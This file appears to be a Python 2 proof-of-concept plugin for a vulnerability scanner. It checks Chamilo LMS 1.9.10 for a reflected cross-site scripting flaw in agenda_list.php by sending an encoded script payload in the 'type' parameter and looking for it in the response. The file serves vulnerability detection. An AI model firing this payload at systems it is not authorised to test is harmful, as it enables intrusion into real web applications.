# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = '7328c9ee-7aa9-461e-9364-2b41bb83ea1f'
    name = 'Chamilo LMS 1.9.10 跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-03-19'  # 漏洞公布时间
    desc = '''
        Chamilo LMS 1.9.10 /main/calendar/agenda_list.php 跨站脚本漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36435/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Chamilo LMS'  # 漏洞应用名称
    product_version = 'Chamilo LMS 1.9.10'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '933b05b8-5bde-45d5-84e0-666d6f7ff9f4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            url = self.target + '/main/calendar/agenda_list.php'
            verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)

            content = response.read()
            if "<script>confirm(1)</script>" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
